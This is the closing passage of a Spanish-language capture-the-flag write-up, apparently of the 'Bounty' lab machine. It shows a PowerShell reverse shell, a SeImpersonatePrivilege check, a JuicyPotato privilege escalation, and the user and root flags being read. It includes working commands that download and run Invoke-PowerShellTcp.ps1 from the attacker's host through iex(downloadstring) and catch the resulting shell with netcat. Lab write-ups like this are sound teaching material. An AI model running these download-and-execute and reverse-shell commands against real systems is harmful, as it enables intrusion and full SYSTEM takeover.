</span></span><span style="display:flex;"><span>10.129.249.222 - - <span style="color:#f92672">[</span>08/Aug/2024 09:41:28<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /Invoke-PowerShellTcp.ps1 HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo rlwrap -cEr nc -lvnp <span style="color:#ae81ff">443</span>
</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.14.91<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.129.249.222<span style="color:#f92672">]</span> <span style="color:#ae81ff">49158</span>
</span></span><span style="display:flex;"><span>Windows PowerShell running as user BOUNTY$ on BOUNTY
</span></span><span style="display:flex;"><span>Copyright <span style="color:#f92672">(</span>C<span style="color:#f92672">)</span> <span style="color:#ae81ff">2015</span> Microsoft Corporation. All rights reserved.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\w</span>indows<span style="color:#ae81ff">\s</span>ystem32<span style="color:#ae81ff">\i</span>netsrv&gt;whoami
</span></span><span style="display:flex;"><span>bounty<span style="color:#ae81ff">\m</span>erlin
</span></span></code></pre></div><p>Y podemos ver la flag de usuario en el directorio personal de <code>merlin</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Users\merlin\Desktop&gt; dir -force
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    Directory<span style="color:#960050;background-color:#1e0010">:</span> C:\Users\merlin\Desktop
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Mode                LastWriteTime     Length Name                              
</span></span><span style="display:flex;"><span>----                -------------     ------ ----                              
</span></span><span style="display:flex;"><span>-a-hs         <span style="color:#ae81ff">5</span>/<span style="color:#ae81ff">30</span>/<span style="color:#ae81ff">2018</span>  <span style="color:#ae81ff">12</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">22</span> AM        <span style="color:#ae81ff">282</span> desktop.ini                       
</span></span><span style="display:flex;"><span>-arh-          <span style="color:#ae81ff">8</span>/<span style="color:#ae81ff">8</span>/<span style="color:#ae81ff">2024</span>   <span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">35</span> AM         <span style="color:#ae81ff">34</span> user.txt                          
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PS C:\Users\merlin\Desktop&gt; type user.txt
</span></span><span style="display:flex;"><span>b42329e84a71be14...
</span></span></code></pre></div><h1 id="privilege-escalation">Privilege Escalation</h1>
<p>Podemos ver que este usuario tiene el privilegio <code>SeImpersonatePrivilege</code>, esto huele a <code>JuicyPotato</code>..</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Users\merlin\Desktop&gt; whoami /priv
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PRIVILEGES INFORMATION
</span></span><span style="display:flex;"><span>----------------------
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Privilege Name                Description                               State   
</span></span><span style="display:flex;"><span>============================= ========================================= ========
</span></span><span style="display:flex;"><span>SeAssignPrimaryTokenPrivilege Replace a <span style="color:#66d9ef">process</span> level token             Disabled
</span></span><span style="display:flex;"><span>SeIncreaseQuotaPrivilege      Adjust memory quotas <span style="color:#66d9ef">for</span> a <span style="color:#66d9ef">process</span>        Disabled
</span></span><span style="display:flex;"><span>SeAuditPrivilege              Generate security audits                  Disabled
</span></span><span style="display:flex;"><span>SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
</span></span><span style="display:flex;"><span>SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
</span></span><span style="display:flex;"><span>SeIncreaseWorkingSetPrivilege Increase a <span style="color:#66d9ef">process</span> working set            Disabled
</span></span></code></pre></div><p>Antes de la explotación, comprobamos el sistema operativo.
<img src="images/Screenshot_9.png" alt="Write-up Image"></p>
<p>Y comprobamos si hay CLSID disponibles para esta versión en el repositorio de <a href="https://github.com/ohpe/juicy-potato/tree/master/CLSID">juicy-potato</a> y vemos que si.
<img src="images/Screenshot_10.png" alt="Write-up Image"></p>
<p>Nos descargamos el <code>JuicyPotato.exe</code> del repositorio y nos lo compartimos a la máquina víctima</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Users\merlin\Desktop&gt; (New-Object System.Net.WebClient).DownloadFile(<span style="color:#e6db74">&#34;http://10.10.14.91:8081/JuicyPotato.exe&#34;</span>, <span style="color:#e6db74">&#34;C:\Users\merlin\Desktop\JuicyPotato.exe&#34;</span>)
</span></span></code></pre></div><p>Y podemos repetir el mismo paso de antes, descargarnos el <code>Invoke-PowerShellTcp.ps1</code> y así mandarnos una reverse shell, y si todo sale bien deberíamos convertirnos en <code>nt\authority system</code></p>
<p>Nos ponemos en escucha con <code>netcat</code> por el puerto 443, y nos compartimos el script con python por el puerto 8081.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Users\merlin\Desktop&gt; .\JuicyPotato.exe -l <span style="color:#ae81ff">1337</span> -p C:\Windows\System32\cmd.exe -a <span style="color:#e6db74">&#34;/c powershell.exe -c iex(new-object net.webclient).downloadstring(&#39;http://10.10.14.91:8081/Invoke-PowerShellTcp.ps1&#39;)&#34;</span> -t *
</span></span><span style="display:flex;"><span>Testing {4991d34b-80a1-<span style="color:#ae81ff">4291</span>-83b6-3328366b9097} <span style="color:#ae81ff">1337</span>
</span></span><span style="display:flex;"><span>....
</span></span><span style="display:flex;"><span>[+] authresult <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>{4991d34b-80a1-<span style="color:#ae81ff">4291</span>-83b6-3328366b9097};NT AUTHORITY\SYSTEM
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[+] CreateProcessWithTokenW OK
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 -m http.server <span style="color:#ae81ff">8081</span>
</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8081</span> <span style="color:#f92672">(</span>http://0.0.0.0:8081/<span style="color:#f92672">)</span> ...
</span></span><span style="display:flex;"><span>10.129.249.222 - - <span style="color:#f92672">[</span>08/Aug/2024 09:55:05<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /Invoke-PowerShellTcp.ps1 HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo rlwrap -cEr nc -lvnp <span style="color:#ae81ff">443</span>
</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.14.91<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.129.249.222<span style="color:#f92672">]</span> <span style="color:#ae81ff">49185</span>
</span></span><span style="display:flex;"><span>Windows PowerShell running as user BOUNTY$ on BOUNTY
</span></span><span style="display:flex;"><span>Copyright <span style="color:#f92672">(</span>C<span style="color:#f92672">)</span> <span style="color:#ae81ff">2015</span> Microsoft Corporation. All rights reserved.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;whoami
</span></span><span style="display:flex;"><span>nt authority<span style="color:#ae81ff">\s</span>ystem
</span></span></code></pre></div><p>Hemos escalado privilegios y ya podemos leer la flag de <code>root</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Users\Administrator\Desktop&gt; type root.txt
</span></span><span style="display:flex;"><span>92608230ded064c7ab...
</span></span></code></pre></div><p>¡Y ya estaría!</p>
<p>Happy Hacking! 🚀</p>

    </div>

    

            </div>
        </div><footer class="text-center pb-1">
    <small class="text-muted">
        
            &copy; 2024, Andrés Del Cerro
        
        <br>
        Powered by <a href="https://gohugo.io/" target="_blank">Hugo</a>
        and <a href="https://github.com/austingebauer/devise" target="_blank">Devise</a>
    </small>
</footer>
</body>
</html>
